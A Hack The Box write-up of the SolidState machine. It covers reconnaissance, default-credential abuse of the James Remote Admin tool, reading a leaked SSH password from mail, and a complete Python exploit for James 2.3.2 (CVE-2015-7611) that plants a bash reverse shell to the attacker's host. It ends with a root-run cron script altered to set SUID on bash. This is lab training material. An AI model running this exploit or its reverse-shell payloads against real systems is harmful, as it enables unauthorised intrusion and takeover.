---
layout: single
title: SolidState  - Hack The Box
excerpt: "SolidState is a medium difficulty machine that requires chaining of multiple attack vectors in order to get a privileged shell. As a note, in some cases the exploit may fail to trigger more than once and a machine reset is required."
date: 2025-06-05
classes: wide
header:
  teaser: /img2/solidstate.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Medium
tags:
  - Abusing James Remote Administration Tool
  - Changing a user's email password
  - Information Leakage
  - Escaping Restricted Bash (rbash) witth James Server 2.3.2 RCE (CVE-2015-7611)
  - Abusing Cron Job [Privilege Escalation]
---


## Reconnaissance

- Nmap

```bash
nmap -sS --open -p- --min-rate 5000 -n -Pn 10.10.10.51
```

```php
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-05 18:51 CEST
Nmap scan report for 10.10.10.51
Host is up (0.13s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip

Nmap done: 1 IP address (1 host up) scanned in 10.84 seconds               
```

- Vulnerability and version scan

```bash
nmap -sCV -p22,25,80,110,119,455 10.10.10.51
```

```php
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-05 18:56 CEST
Nmap scan report for 10.10.10.51
Host is up (0.060s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.16.7 [10.10.16.7])
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.64 seconds
```

- Connect to James Remote Admin

```bash
nc 10.10.10.51 4555
```

```php
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

- Change all users password and test

```php
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
setpassword mindy mypassword
Password for mindy reset
```

## Exploitation

- Leaked credentials in pop3 service

```bash
telnet 10.10.10.51 110
```

```php
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS mypassword
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

> Username: mindy
> Password: P@55W0rd1!2@

- Connect ssh 

```bash
ssh mindy@10.10.10.51
```

```php
mindy@solidstate:~$ echo $SHELL
/bin/rbash
```

> We are inside restricted bash, so we need to escape

## Post-exploitation

- James Server 2.3.2 RCE (CVE-2015-7611)

```python
#!/usr/bin/python3

import socket
import sys
import time

# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd = 'root'

if len(sys.argv) != 4:
    sys.stderr.write("[-]Usage: python3 %s <remote ip> <local ip> <local listener port>\n" % sys.argv[0])
    sys.stderr.write("[-]Example: python3 %s 172.16.1.66 172.16.1.139 443\n" % sys.argv[0])
    sys.stderr.write("[-]Note: The default payload is a basic bash reverse shell - check script for details and other options.\n")
    sys.exit(1)

remote_ip = sys.argv[1]
local_ip = sys.argv[2]
port = sys.argv[3]

# Select payload prior to running script - default is a reverse shell executed upon any user logging in (i.e. via SSH)
payload = '/bin/bash -i >& /dev/tcp/' + local_ip + '/' + port + ' 0>&1' # basic bash reverse shell exploit executes after user login
#payload = 'nc -e /bin/sh ' + local_ip + ' ' + port # basic netcat reverse shell
#payload = 'echo $USER && cat /etc/passwd && ping -c 4 ' + local_ip # test remote command execution capabilities and connectivity
#payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # proof of concept exploit on root user login only

print ("[+]Payload Selected (see script for more options): ", payload)
if '/bin/bash' in payload:
    print ("[+]Example netcat listener syntax to use after successful execution: nc -lvnp", port)


def recv(s):
        s.recv(1024)
        time.sleep(0.2)

try:
    print ("[+]Connecting to James Remote Administration Tool...")
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((remote_ip,4555)) # Assumes James Remote Administration Tool is running on Port 4555, change if necessary.
    s.recv(1024)
    s.send((user + "\n").encode('utf-8'))
    s.recv(1024)
    s.send((pwd + "\n").encode('utf-8'))
    s.recv(1024)
    print ("[+]Creating user...")
    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n".encode('utf-8'))
    s.recv(1024)
    s.send("quit\n".encode('utf-8'))
    s.close()

    print ("[+]Connecting to James SMTP server...")
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((remote_ip,25)) # Assumes default SMTP port, change if necessary.
    s.send("ehlo team@team.pl\r\n".encode('utf-8'))
    recv(s)
    print ("[+]Sending payload...")
    s.send("mail from: <'@team.pl>\r\n".encode('utf-8'))
    recv(s)
    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n".encode('utf-8')) if the recipient cannot be found
    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n".encode('utf-8'))
    recv(s)
    s.send("data\r\n".encode('utf-8'))
    recv(s)
    s.send("From: team@team.pl\r\n".encode('utf-8'))
    s.send("\r\n".encode('utf-8'))
    s.send("'\n".encode('utf-8'))
    s.send((payload + "\n").encode('utf-8'))
    s.send("\r\n.\r\n".encode('utf-8'))
    recv(s)
    s.send("quit\r\n".encode('utf-8'))
    recv(s)
    s.close()
    print ("[+]Done! Payload will be executed once somebody logs in (i.e. via SSH).")
    if '/bin/bash' in payload:
        print ("[+]Don't forget to start a listener on port", port, "before logging in!")
except:
    print ("Connection failed.")
```

```bash
python3 exploit.py 10.10.10.51 10.10.16.7 9000
```

```php
[+]Payload Selected (see script for more options):  /bin/bash -i >& /dev/tcp/10.10.16.7/9000 0>&1
[+]Example netcat listener syntax to use after successful execution: nc -lvnp 9000
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in (i.e. via SSH).
[+]Don't forget to start a listener on port 9000 before logging in!
```

> Payload has sent, so we need to login and listen

```bash
ssh mindy@10.10.10.51
```

```bash
nc -nlvp 9000
```

```php
listening on [any] 9000 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.51] 47046
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ echo $SHELL
/bin/rbash
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ export SHELL=bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ echo $SHELL
bash
```

- Abusing crontab

```bash
#!/bin/bash

old_process=$(ps -eo user,command)

echo -e "[+] Listing new commands...\n\n"
while true;do
        new_process=$(ps -eo user,command)
        diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "procmon|kworker"
        old_process=$new_process
done
```

```bash
chmod +x procmon.sh
```

```bash
./procmon.sh 
```

```php
[+] Listing new commands...


> root     /usr/sbin/CRON -f
> root     /bin/sh -c python /opt/tmp.py
> root     python /opt/tmp.py
< root     /usr/sbin/CRON -f
< root     /bin/sh -c python /opt/tmp.py
< root     python /opt/tmp.py
```

> Cron job is executing by root let's check the python file

```bash
ls -l /opt/tmp
```

```php
-rwxrwxrwx 1 root root 65 Jun  5 14:27 /opt/tmp.py
```

> We can change the content

```python
#!/usr/bin/env python
import os
os.system("chmod u+s /bin/bash")
```

```bash
bash -p 
```

```php
bash-4.4# whoami
root
```

![](/img2/Pasted%20image%2020250605203251.png)